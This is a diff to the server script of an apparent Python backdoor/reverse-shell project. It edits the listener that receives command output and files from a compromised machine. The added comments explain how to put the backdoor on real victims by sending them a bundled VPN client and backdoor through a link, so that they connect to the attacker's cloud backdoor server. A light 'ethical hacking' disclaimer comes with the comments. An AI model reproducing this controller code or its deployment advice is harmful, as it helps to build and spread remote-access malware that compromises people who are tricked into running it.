@@ -22,7 +22,7 @@ def reliable_recv():
             # "Backdoor coding.one\ncompile-reverse.sh\nREADME.md\nremove-compile.sh\nreverse_shell.py\nserver.py\n"
             # type(json_data_decode()) => String
             json_data_decode = json_data.decode()
-            print(f'json_data_decode: {json_data_decode}')
+            #print(f'json_data_decode: {json_data_decode}')
             print(f'***************************************')
             # type(json_data_decode_strip) => String
             #json_data_decode_strip = json_data.decode().strip()
@@ -32,7 +32,7 @@ def reliable_recv():
             # clean_json_data = "".join(json_data_decode)
             # print(f'clean_json_data: {clean_json_data}')
             clean_json_data = json_data_decode.replace('\n', '')
-            print(f'clean_json_data: {clean_json_data}')
+            #print(f'clean_json_data: {clean_json_data}')
             print(f'***************************************')
             # Theory
             # If target.recv <= 1024 bytes
@@ -97,8 +97,8 @@ def shell():
             with open(command[9:], 'wb') as file:
                 print("Waiting for file data...")
                 result = reliable_recv()
-                print(f'Printing result\n{result}')
-                print(f'Printing type(result)\n{type(result)}')
+                #print(f'Printing result\n{result}')
+                #print(f'Printing type(result)\n{type(result)}')
                 print("File data received, Decoding...")
                 #result_b64decode = base64.b64decode(result)
                 print("Decoding complete. Writing to file...")
@@ -151,11 +151,27 @@ def server():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Binding to a port
-    # If you're trying to bind your socket to Public IP
-    # you're crossing the boundary of Ethical Hacking ;)
+    
+    # In reality, you'll need to code a VPN client for your
+    # victims to connect to your cloud network as if your
+    # victims are in the same network of your Backdoor Server
+
+    # Then, send your victims the bundle of VPN+Backdoor Clients
+    # When your victims click the link, they're instantly 
+    # connected to your Cloud Backdoor Server
+    # Then, this Backdoor client is connected as if locally to
+    # your Cloud Backdoor Server ;)
+
+    # Thus, the IP_ADDRESS in both server.py & reverse_shell.py
+    # shall be the localhost IP address 
+    # of your Cloud Backdoor Server ;)
+    
+    # If you insist performing the captioned procedure, then
+    # you'll be crossing the boundary of Ethical Hacking ;)
     # FBI is watching you :D
-    IP_ADDRESS = '192.168.31.127'
-    #IP_ADDRESS = '127.0.0.1'
+    #IP_ADDRESS = '192.168.31.127'
+    IP_ADDRESS = '192.168.8.180'
+    # Your Cloud Backdoor Server should be running server.py all the time
     port = 54321
     print(f'Binding port: {port}...\n')
     s.bind((IP_ADDRESS, port))
